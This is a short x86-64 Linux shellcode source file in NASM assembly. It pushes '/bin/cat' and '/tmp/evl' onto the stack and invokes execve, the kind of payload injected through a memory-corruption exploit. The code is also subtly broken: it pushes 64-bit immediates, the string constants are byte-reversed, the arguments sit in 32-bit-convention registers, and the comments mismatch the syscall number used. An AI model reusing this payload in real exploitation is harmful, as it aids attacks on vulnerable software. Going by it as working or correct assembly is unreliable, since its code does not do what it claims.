BITS 64
    ;; /bin/cat shellcode for 64-bit linux.

    ;; execve(const char *filename, char *const argv[], char *const envp[])
    ;;   0x0b            &/bin/cat, [&/bin/cat, &PATH],              &NULL)
    ;;    eax,                 ebx,                ecx,                edx

    ;; /bin/cat on stack
    xor rax, rax
    push rax
    push 0x6e69622f7461632f ; push "/bin/cat"
    mov rbx, rsp            ; rbx -> "/bin/cat"

    ;; /tmp/evl on stack
    push rax
    push 0x706d742f6c76652f ; push "/tmp/evl"
    mov rdx, rsp            ; rdx -> "/tmp/evl"

    ;; argv[]
    push rax ; terminate
    push rdx
    push rbx
    mov rcx, rsp ; rcx <= argv

    ;; envp[]
    push rax
    mov rdx, rsp ; rdx <= envp[]

    ;; execve()
    mov al, 0x3b
    syscall